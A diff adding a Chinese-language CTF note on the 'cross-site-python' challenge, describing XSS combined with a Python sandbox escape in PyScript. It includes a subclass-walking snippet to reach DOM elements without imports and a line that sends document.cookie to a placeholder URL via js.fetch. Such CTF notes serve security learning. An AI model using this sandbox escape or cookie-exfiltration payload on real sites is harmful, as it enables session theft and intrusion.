@@ -2353,3 +2353,15 @@ vim file1
 ls -a
 . .. file1 .file1.swp
 ```
+241. [cross-site-python](https://ctftime.org/writeup/37172)
+- 利用[PyScript](https://pyscript.net/)进行XSS+沙盒逃逸。pyscript内部有`pyscript.Element`类，允许我们访问+修改DOM里的元素。以下是在无import环境下使用pyscript.Element修改DOM的代码：
+```py
+but = dict.__base__.__subclasses__()[363]("buttons") #363为pyscript.Element。此处获取按钮
+but.element.innerHTML= ''
+```
+- 当python环境中无builtins时，可以参考这篇[帖子](https://www.reddit.com/r/Python/comments/yaqoux/recovering_cleared_globals_and_builtins/)恢复原本的builtins。有了builtins就能正常使用import了。 https://ctftime.org/writeup/37185
+- 从pyscript中可以获取js模块，进而可使用js的函数。
+```py
+js = sys.modules['pyscr' + 'ipt'].js
+js.fetch("url" + js.document.cookie)
+```
